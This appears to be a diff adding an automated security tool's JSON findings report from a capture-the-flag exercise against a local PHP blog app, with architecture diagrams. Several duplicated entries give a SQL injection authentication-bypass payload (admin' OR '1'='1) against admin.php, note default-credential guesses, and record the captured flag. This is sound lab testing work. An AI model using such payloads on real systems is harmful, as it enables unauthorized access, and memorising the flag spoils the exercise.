@@ -1,0 +1,102 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:44:21.108668+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d4e6c30e-433c-4e1c-a493-79b849be8a8e",
+      "timestamp": "2026-04-14T23:44:21.108521+00:00",
+      "title": "SQL Injection in Admin Login - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43105/admin.php",
+      "description": "SQL injection vulnerability in the admin login form allows authentication bypass. The username parameter is vulnerable to SQL injection, enabling login as admin without valid credentials.",
+      "evidence": "flag{c969819d-7a14-4c90-b85d-51eccd232580}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /admin.php with body: username=admin' OR '1'='1&password=test",
+        "expected": "flag{c969819d-7a14-4c90-b85d-51eccd232580} returned in response body"
+      }
+    },
+    {
+      "id": "af28b1cd-3c46-4800-b4a2-5490e59d86f2",
+      "timestamp": "2026-04-14T23:44:21.118491+00:00",
+      "title": "SQL Injection in Admin Login - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43105/admin.php",
+      "description": "SQL injection vulnerability in the admin login form allows authentication bypass. The username parameter is vulnerable to SQL injection, enabling login as admin without valid credentials.",
+      "evidence": "flag{c969819d-7a14-4c90-b85d-51eccd232580}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /admin.php with body: username=admin' OR '1'='1&password=test",
+        "expected": "flag{c969819d-7a14-4c90-b85d-51eccd232580} returned in response body"
+      }
+    },
+    {
+      "id": "3850336b-507b-40a6-8af9-cbc135533b29",
+      "timestamp": "2026-04-14T23:44:21.209315+00:00",
+      "title": "SQL Injection in Admin Login - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43105/admin.php",
+      "description": "SQL injection vulnerability in the admin login form allows authentication bypass. The username parameter is vulnerable to SQL injection, enabling login as admin without valid credentials.",
+      "evidence": "flag{c969819d-7a14-4c90-b85d-51eccd232580}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /admin.php with body: username=admin' OR '1'='1&password=test",
+        "expected": "flag{c969819d-7a14-4c90-b85d-51eccd232580} returned in response body"
+      }
+    },
+    {
+      "id": "ba83f255-da0e-4027-841b-1ca9af0c75b0",
+      "timestamp": "2026-04-14T23:45:10.611978+00:00",
+      "title": "Authentication Bypass via SQL Injection - Credential Audit",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43105/admin.php",
+      "description": "The admin login form is vulnerable to SQL injection in the username parameter. Authentication can be bypassed without valid credentials using SQL injection payload: admin' OR '1'='1. Default credentials (admin:admin, admin:password, admin:123456) were tested and rejected, confirming the application relies on SQL query logic rather than hardcoded credentials.",
+      "evidence": "SQL injection payload 'admin' OR '1'='1' bypasses authentication and returns flag{c969819d-7a14-4c90-b85d-51eccd232580} in response body",
+      "tool_used": "credential-audit",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /admin.php -d 'username=admin' OR '1'='1&password=test'",
+        "expected": "Authentication bypass - flag returned"
+      }
+    },
+    {
+      "id": "1e601131-203b-4afd-b53a-621efb89102f",
+      "timestamp": "2026-04-14T23:45:10.681114+00:00",
+      "title": "Authentication Bypass via SQL Injection - Credential Audit",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43105/admin.php",
+      "description": "The admin login form is vulnerable to SQL injection in the username parameter. Authentication can be bypassed without valid credentials using SQL injection payload: admin' OR '1'='1. Default credentials (admin:admin, admin:password, admin:123456) were tested and rejected, confirming the application relies on SQL query logic rather than hardcoded credentials.",
+      "evidence": "SQL injection payload 'admin' OR '1'='1' bypasses authentication and returns flag{c969819d-7a14-4c90-b85d-51eccd232580} in response body",
+      "tool_used": "credential-audit",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /admin.php -d 'username=admin' OR '1'='1&password=test'",
+        "expected": "Authentication bypass - flag returned"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "5034756d-b44f-4643-a847-6971bfb372fe",
+      "timestamp": "2026-04-14T23:44:30.780597+00:00",
+      "title": "CTF Blog Application Architecture",
+      "mermaid": "graph TD\n    A[Browser] -->|HTTP GET/POST| B[Apache/2.4.54 + PHP 7.4.33]\n    B --> C[index.php - Blog Home]\n    B --> D[admin.php - Admin Login]\n    B --> E[styles.css]\n    C -->|GET ?category=| F[(MySQL Database)]\n    D -->|POST username/password| F\n    F -->|SQL Query - Vulnerable| D\n    F -->|Category Filter| C\n    \n    style D fill:#f66\n    style F fill:#f66"
+    },
+    {
+      "id": "f3f2dc07-4131-49fd-8632-e62c24ba8936",
+      "timestamp": "2026-04-14T23:44:30.850220+00:00",
+      "title": "CTF Blog Application Architecture",
+      "mermaid": "graph TD\n    A[Browser] -->|HTTP GET/POST| B[Apache/2.4.54 + PHP 7.4.33]\n    B --> C[index.php - Blog Home]\n    B --> D[admin.php - Admin Login]\n    B --> E[styles.css]\n    C -->|GET ?category=| F[(MySQL Database)]\n    D -->|POST username/password| F\n    F -->|SQL Query - Vulnerable| D\n    F -->|Category Filter| C\n    \n    style D fill:#f66\n    style F fill:#f66"
+    }
+  ]
+}
